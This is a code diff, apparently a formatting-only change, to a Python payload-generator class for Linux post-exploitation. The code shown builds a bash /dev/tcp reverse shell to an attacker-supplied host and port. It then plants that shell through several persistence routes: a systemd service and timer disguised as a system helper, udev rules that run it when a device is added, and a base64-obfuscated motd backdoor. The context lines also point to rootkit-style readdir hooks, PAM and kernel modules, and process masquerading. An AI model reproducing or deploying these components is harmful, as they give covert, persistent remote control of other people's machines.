@@ -100,9 +100,7 @@ class LinuxAdvancedPayloadFactory:
         output_dir: Directory for generated artifacts.
     """
 
-    _REVERSE_SHELL = (
-        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-    )
+    _REVERSE_SHELL = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 
     def __init__(self, config: LinuxAdvancedConfig | None = None, output_dir: Path | None = None):
         self.config = config or LinuxAdvancedConfig()
@@ -243,7 +241,7 @@ struct dirent64 *readdir64(DIR *dirp) {{
         Returns:
             eBPF C source code.
         """
-        return f'''\
+        return f"""\
 #include <linux/bpf.h>
 #include <linux/if_ether.h>
 #include <linux/ip.h>
@@ -301,7 +299,7 @@ int xdp_filter(struct xdp_md *ctx) {{
 }}
 
 char _license[] SEC("license") = "GPL";
-'''
+"""
 
     @staticmethod
     def _ip_to_hex(ip_str: str) -> str:
@@ -404,11 +402,9 @@ PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc,
             Dict with service_unit and timer_unit content strings.
         """
         svc_name = self.config.systemd_service_name
-        shell_cmd = self._REVERSE_SHELL.format(
-            lhost=self.config.lhost, lport=str(self.config.lport)
-        )
+        shell_cmd = self._REVERSE_SHELL.format(lhost=self.config.lhost, lport=str(self.config.lport))
 
-        service_unit = f'''\
+        service_unit = f"""\
 [Unit]
 Description={svc_name} - System Helper Service
 After=network.target network-online.target
@@ -430,9 +426,9 @@ ProtectHome=no
 
 [Install]
 WantedBy=multi-user.target
-'''
+"""
 
-        timer_unit = f'''\
+        timer_unit = f"""\
 [Unit]
 Description={svc_name} - Periodic Timer
 Requires={svc_name}.service
@@ -445,7 +441,7 @@ Persistent=true
 
 [Install]
 WantedBy=timers.target
-'''
+"""
 
         return {
             "service_unit": service_unit,
@@ -655,6 +651,7 @@ module_exit(lazy_km_exit);
             "/usr/lib/polkit-1/polkitd --no-debug",
         ]
         import random
+
         chosen = random.choice(mask_names)
 
         return f'''\
@@ -682,14 +679,12 @@ disown
         Returns:
             Udev rule content string.
         """
-        shell_cmd = self._REVERSE_SHELL.format(
-            lhost=self.config.lhost, lport=str(self.config.lport)
-        )
+        shell_cmd = self._REVERSE_SHELL.format(lhost=self.config.lhost, lport=str(self.config.lport))
 
-        return f'''\
+        return f"""\
 ACTION=="add", ENV{{ID_MODEL}}=="*", RUN+="/bin/bash -c '{shell_cmd} &'"
 ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '{shell_cmd} &'"
-'''
+"""
 
     def generate_motd_backdoor(self) -> str:
         """Generate a Message of the Day (motd) hook for persistence.
@@ -701,15 +696,13 @@ ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '{shell_cmd} &'"
             Shell script for motd/profiled persistence.
         """
         encoded = base64.b64encode(
-            self._REVERSE_SHELL.format(
-                lhost=self.config.lhost, lport=str(self.config.lport)
-            ).encode()
+            self._REVERSE_SHELL.format(lhost=self.config.lhost, lport=str(self.config.lport)).encode()
         ).decode()
 
-        return f'''\
+        return f"""\
 #!/bin/bash
 echo {encoded} | base64 -d | bash &
-'''
+"""
 
     def compile_c_source(self, source: str, output_name: str, shared: bool = False) -> Path | None:
         """Compile C source code to a binary or shared library.
@@ -741,9 +734,7 @@ echo {encoded} | base64 -d | bash &
             args.extend(["-lpam"])
 
         try:
-            result = subprocess.run(
-                args, capture_output=True, text=True, timeout=30
-            )
+            result = subprocess.run(args, capture_output=True, text=True, timeout=30)
             if result.returncode == 0 and output_path.exists():
                 return output_path
             return None
